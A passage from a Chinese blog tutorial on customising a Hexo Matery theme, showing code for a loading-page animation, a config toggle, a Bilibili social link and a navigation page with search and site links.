property">-webkit-transform</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span><span class="token property">transform</span><span class="token punctuation">:</span>none<span class="token punctuation">}</span><span class="token punctuation">}</span>
    <span class="token atrule"><span class="token rule">@keyframes</span> fadeInDown</span><span class="token punctuation">{</span><span class="token selector">0%</span><span class="token punctuation">{</span><span class="token property">opacity</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token property">-webkit-transform</span><span class="token punctuation">:</span>translate<span class="token number">3</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token number">0</span>,-<span class="token number">100%</span>,<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
 </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
<span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> loaded <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
       <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">const</span> loader <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"loading-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            loader<span class="token punctuation">.</span>className<span class="token operator">=</span><span class="token string">"fadeout"</span> <span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用渐隐的方法淡出loading page</span>
            <span class="token comment" spellcheck="true">// document.getElementById("body-wrap").style.display="flex";</span>
            <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                loader<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">2500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//强制显示loading page 1s  </span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">loaded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="2、在主题的-layout-目录找到-layout-ejs-文件"><a href="#2、在主题的-layout-目录找到-layout-ejs-文件" class="headerlink" title="2、在主题的 layout 目录找到 layout.ejs 文件"></a>2、在主题的 <code>layout</code> 目录找到 <code>layout.ejs</code> 文件</h5><p>在 <code>&lt;body&gt;</code> 附近添加内容后如下：</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE HTML></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> config.language %<span class="token punctuation">></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
&lt;%- partial('_partial/head') %>

 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.loadingPages.enable)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    &lt;%- partial('_partial/loading-pages') %>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.loadingPages.enable)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loading-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loading-text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>嘘~  正在从服务器偷取页面 . . . <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span> 
             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>loading-image<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> 
                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>

    &lt;%- partial('_partial/header') %>
    ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="3、在主题配置文件-config-yml添加开关配置"><a href="#3、在主题配置文件-config-yml添加开关配置" class="headerlink" title="3、在主题配置文件_config.yml添加开关配置"></a>3、在主题配置文件<code>_config.yml</code>添加开关配置</h5><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">loadingPages</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><code>enable</code> 设置为 <code>true</code> 表示开启加载动画， <code>false</code> 表示关闭加载动画。</p>
<h3 id="主页新增关注我的Bilibili"><a href="#主页新增关注我的Bilibili" class="headerlink" title="主页新增关注我的Bilibili"></a>主页新增关注我的Bilibili</h3><p>进入主题路径<code>\layout\_partial\social-link.ejs</code></p>
<p>新增以下代码</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>socialLink<span class="token punctuation">.</span>bilibili<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"&lt;%= theme.socialLink.bilibili %>"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"tooltipped"</span> target<span class="token operator">=</span><span class="token string">"_blank"</span> data<span class="token operator">-</span>tooltip<span class="token operator">=</span><span class="token string">"在B站上关注我"</span> <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">=</span> theme<span class="token punctuation">.</span>socialLink<span class="token punctuation">.</span>bilbili <span class="token operator">%</span><span class="token operator">></span><span class="token string">" data-position="</span>top<span class="token string">" data-delay="</span><span class="token number">50</span>"<span class="token operator">></span>
        <span class="token operator">&lt;</span>i <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"fas fa-play-circle"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>i<span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>进入主题配置文件<code>_config.yml</code></p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">bilibili</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#https://space.bilibili.com/xxx</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Hexo添加博客导航页"><a href="#Hexo添加博客导航页" class="headerlink" title="**Hexo添加博客导航页"></a>**Hexo添加博客导航页</h3><p>新建页面，执行下面的命令</p>
<pre class="line-numbers language-bash"><code class="language-bash">hexo new page navigate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改 <code>navigate</code> 目录下的 <code>index.md</code> 的格式</p>
<pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: 导航
date: 2020-05-09 11:19:14
type: "navigate"
layout: "navigate"
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在主题配置文件<code>_config.yml</code>中添加导航</p>
<pre class="line-numbers language-yaml"><code class="language-yaml">  <span class="token key atrule">导航</span><span class="token punctuation">:</span>
    <span class="token key atrule">url</span><span class="token punctuation">:</span> /navigate
    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>location<span class="token punctuation">-</span>arrow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在 <code>matery/layout</code> 下新建 <code>navigate.ejs</code></p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navi-height bg-cover pd-header <span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span> link-box container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token comment" spellcheck="true">&lt;!-- 搜索框 --></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>baidu baidu-2 large-screen<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>f<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.baidu.com/<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Select-2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Select-box-2<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>baidu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">46</span>px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>this_s<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>百 · 度<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bing_s<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>必 · 应<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>google_s<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>谷 · 歌<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>baidu_s<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>百 · 度<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wd<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>kw-2<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>qingkong<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>qingkong<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>清 · 空<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>搜 · 索<span class="token punctuation">"</span></span>
                    <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>su-2<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>keylist<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- 链接 --></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row tags-posts <span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col s12 m6 l4 friend-div<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zoom-in-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-tit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>娱乐 · 影视<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-con<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.jd.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>京东<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.taobao.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>淘宝<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.tmall.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>天猫<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https:pixiv.net<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Pixiv<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://zh.moegirl.org/Mainpage/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>萌娘百科<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.bilibili.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>哔哩哔哩<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.netflix.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>NETFLIX<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.spotify.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Spotify<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col s12 m6 l4 friend-div<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zoom-in-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-tit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>社区 · Code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-con<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://blog.nmslwsnd.com/contact/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>留言<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
